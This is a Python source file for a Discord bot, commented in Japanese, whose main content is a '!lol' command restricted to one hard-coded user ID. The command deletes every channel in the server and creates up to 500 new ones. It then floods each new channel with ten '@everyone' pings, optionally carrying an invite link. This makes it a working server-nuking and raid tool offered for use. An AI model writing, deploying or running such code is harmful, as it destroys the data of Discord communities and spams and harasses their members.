import discord
from discord.ext import commands
import random
import os
from keep_alive import keep_alive

# ボットの設定
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

# 特定のユーザーID（あなたのDiscord ID）
ALLOWED_USER_ID = 1464850594790637569

@bot.event
async def on_ready():
    print(f'{bot.user} としてログインしました！')
    print(f'ボットID: {bot.user.id}')
    print('------')

@bot.command()
async def lol(ctx, count: int = 100, invite_url: str = None):
    # 許可されたユーザーIDかチェック（メッセージなし）
    if ctx.author.id != ALLOWED_USER_ID:
        return
    
    # 最大500個に制限
    if count > 500:
        count = 500
        print(f"⚠️ 最大500個に制限されました")
    
    guild = ctx.guild
    
    try:
        # 既存の全チャンネルを並行削除（高速化）
        import asyncio
        delete_tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        print(f"全チャンネル削除完了")
        
        # 新しいチャンネルを並行作成（超高速化）
        create_tasks = []
        for i in range(count):
            random_number = random.randint(1000, 9999)
            channel_name = f"lol-{random_number}"
            create_tasks.append(guild.create_text_channel(channel_name))
        
        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
        # エラーではないチャンネルのみフィルタ
        channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]
        print(f"{len(channels)}個のチャンネルを作成しました")
        
        # 各チャンネルに全員メンション＋招待URLを10回連投
        if invite_url:
            message = f"@everyone {invite_url}"
        else:
            message = "@everyone"
        
        spam_tasks = []
        for channel in channels:
            for _ in range(10):
                spam_tasks.append(channel.send(message))
        
        await asyncio.gather(*spam_tasks, return_exceptions=True)
        print(f"処理完了！全チャンネルにメッセージを送信しました")
        
    except Exception as e:
        print(f"エラーが発生しました: {e}")

# Keep-aliveを起動（24時間稼働用）
keep_alive()

# ボットを起動（環境変数からトークンを取得）
TOKEN = os.environ.get('DISCORD_BOT_TOKEN')
if not TOKEN:
    print("エラー: DISCORD_BOT_TOKEN 環境変数が設定されていません。")
    print("Secrets タブで DISCORD_BOT_TOKEN を設定してください。")
    exit(1)

bot.run(TOKEN)
